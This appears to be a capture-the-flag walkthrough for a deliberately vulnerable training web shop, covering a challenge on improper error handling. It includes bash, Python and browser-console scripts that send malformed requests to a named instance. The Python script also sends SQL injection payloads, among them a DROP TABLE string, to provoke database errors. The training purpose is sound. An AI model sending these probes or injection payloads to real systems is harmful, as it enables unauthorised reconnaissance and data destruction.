# Challenge 7: Error Handling

## Difficulty: ⭐ (1/5)

## Objective
Trigger an error that is improperly handled by the application.

## Vulnerability
The application reveals sensitive information in error messages.

## Solution

### Method 1: Invalid API Requests
1. Open Developer Tools (F12)
2. Go to Network tab
3. Try to access invalid API endpoints
4. Look for error messages that reveal stack traces

### Method 2: Invalid Input
1. Try to access non-existent product IDs
2. Use special characters in input fields
3. Submit malformed data to forms

### Method 3: Direct API Call
Navigate to: `https://[your-instance].wonkatech.org/rest/qwertz`
This will trigger an error and complete the challenge.

## Automated Script:
```bash
#!/bin/bash
# save as: error_handling.sh

TARGET="https://juice3.wonkatech.org"

echo "💥 Triggering Error Handling issues..."

# Method 1: Access non-existent API endpoint
echo "Accessing invalid endpoint..."
curl -s "${TARGET}/rest/qwertz" | head -20

# Method 2: Invalid product ID
echo -e "\nTrying invalid product ID..."
curl -s "${TARGET}/api/Products/99999"

# Method 3: Malformed JSON
echo -e "\nSending malformed JSON..."
curl -X POST "${TARGET}/api/Users/" \
  -H "Content-Type: application/json" \
  -d '{"invalid json}'

echo -e "\n✅ Check the responses for stack traces or sensitive error information"
```

## Python Automation:
```python
#!/usr/bin/env python3
# save as: challenge_07_error_handling.py

import requests
import json

def trigger_error_handling(base_url):
    """Trigger various errors to find improper error handling"""
    
    print(f"🎯 Challenge 7: Error Handling on {base_url}")
    
    errors_found = []
    
    # Method 1: Non-existent endpoint
    print("\n💥 Method 1: Invalid endpoint")
    invalid_endpoints = [
        "/rest/qwertz",
        "/api/NonExistent",
        "/rest/admin/users",
        "/api/Products/ABC",
        "/rest/products/search?q="
    ]
    
    for endpoint in invalid_endpoints:
        try:
            url = f"{base_url}{endpoint}"
            response = requests.get(url)
            
            # Check for error information leakage
            if response.status_code >= 400:
                print(f"❌ Error {response.status_code} at: {endpoint}")
                
                # Look for stack traces or sensitive info
                error_indicators = [
                    "stack", "trace", "error", "exception",
                    "sqlite", "mysql", "postgres", "mongodb",
                    "at line", "file:", "path:", "directory:"
                ]
                
                response_text = response.text.lower()
                for indicator in error_indicators:
                    if indicator in response_text:
                        print(f"  ⚠️  Found '{indicator}' in error response!")
                        errors_found.append(endpoint)
                        break
                        
        except Exception as e:
            print(f"  Exception: {e}")
    
    # Method 2: Malformed requests
    print("\n💥 Method 2: Malformed requests")
    
    # Bad JSON
    try:
        response = requests.post(
            f"{base_url}/api/Users/",
            data='{"bad json}',
            headers={"Content-Type": "application/json"}
        )
        if response.status_code >= 400:
            print(f"❌ Bad JSON error: {response.status_code}")
            if "parse" in response.text.lower() or "json" in response.text.lower():
                print("  ⚠️  JSON parsing error exposed!")
    except:
        pass
    
    # Method 3: SQL Injection attempts (for error messages)
    print("\n💥 Method 3: SQL error triggers")
    sql_triggers = [
        "' OR '1'='1",
        "'; DROP TABLE users--",
        "1' AND '1' = '2",
        "' UNION SELECT NULL--"
    ]
    
    for payload in sql_triggers:
        try:
            response = requests.get(
                f"{base_url}/rest/products/search",
                params={"q": payload}
            )
            if "sql" in response.text.lower() or "sqlite" in response.text.lower():
                print(f"  ⚠️  SQL error exposed with payload: {payload}")
                errors_found.append(f"SQL: {payload}")
        except:
            pass
    
    # The specific challenge completion
    print("\n✅ To complete the challenge, visit:")
    print(f"   {base_url}/rest/qwertz")
    print("\nThis triggers an unhandled error and completes the challenge!")
    
    if errors_found:
        print(f"\n📋 Found {len(errors_found)} error handling issues")
    
    return errors_found

if __name__ == "__main__":
    BASE_URL = "https://juice3.wonkatech.org"
    trigger_error_handling(BASE_URL)
```

## Browser Console Method:
```javascript
// Run in browser console
// Trigger various errors

// Method 1: Direct fetch to invalid endpoint
fetch('/rest/qwertz')
  .then(r => r.text())
  .then(console.log);

// Method 2: Invalid API calls
fetch('/api/Products/invalid')
  .then(r => r.text())
  .then(console.log);

// Method 3: Malformed request
fetch('/api/Users/', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: '{invalid json}'
}).then(r => r.text()).then(console.log);
```

## Learning Points
- Error messages should never reveal system internals
- Stack traces should be logged, not shown to users
- Use generic error messages for production
- Implement proper error handling middleware
- Log detailed errors server-side for debugging